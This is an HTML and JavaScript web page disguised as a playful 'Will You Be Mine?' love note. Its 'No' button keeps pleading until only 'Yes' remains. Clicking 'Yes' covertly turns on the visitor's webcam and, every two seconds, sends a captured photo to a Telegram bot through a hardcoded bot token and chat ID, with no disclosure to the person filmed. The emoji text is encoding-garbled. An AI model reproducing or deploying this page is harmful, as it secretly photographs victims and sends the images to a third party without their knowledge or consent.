  <style>

<body>
  <div id="app" class="container">
    <h1>Will You Be Mine?</h1>
    <button class="btn" onclick="handleYes()">Yes</button>
    <button class="btn" onclick="handleNo()">No</button>
  </div>

  <video id="camera" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    let noClickCount = 0;

    function handleYes() {
      const app = document.getElementById('app');
      app.innerHTML = `
        <h1>Thank you for be Mine!</h1>
        <div class="emoji">‚ù§Ô∏è</div>
        <p>I love you so muchü•π</p>
      `;
      startContinuousCapture();
    }

    function handleNo() {
      const app = document.getElementById('app');
      const messages = [
        "Please Be Mineüò¢",
        "Please reconsider and be mine.. üôè",
        "Don't break my heart! Pleaseü•∫",
        "Will You Be Mine...",
      ];
      const emojis = ["üò¢", "üòî", "üíî", "üò≠"];

      if (noClickCount < messages.length) {
        app.innerHTML = `
          <h1>${messages[noClickCount]}</h1>
          <div class="emoji">${emojis[noClickCount]}</div>
          <button class="btn" onclick="handleYes()">Yes</button>
          <button class="btn" onclick="handleNo()">No</button>
        `;
        noClickCount++;
      } else {
        app.innerHTML = `
          <h1>You are mine...</h1>
          <div class="emoji">ü•π</div>
          <button class="btn" onclick="handleYes()">Yes</button>
        `;
      }
    }

    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    const botToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // Replace with your bot token
    const chatId = "1987016824"; // Replace with your chat ID

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
      } catch (error) {
        alert('Camera access denied or unavailable!');
        console.error(error);
      }
    }

    async function captureAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/png');
      const blob = dataURItoBlob(imageData);
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.png');

      try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (result.ok) {
          console.log('Photo sent successfully!');
        } else {
          console.error('Failed to send photo!', result);
        }
      } catch (error) {
        console.error('Error sending photo!', error);
      }
    }

    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    }

    async function startContinuousCapture() {
  await startCamera();
  setInterval(captureAndSend, 2000); // 2000 ms = 2 seconds

    }
  </script>
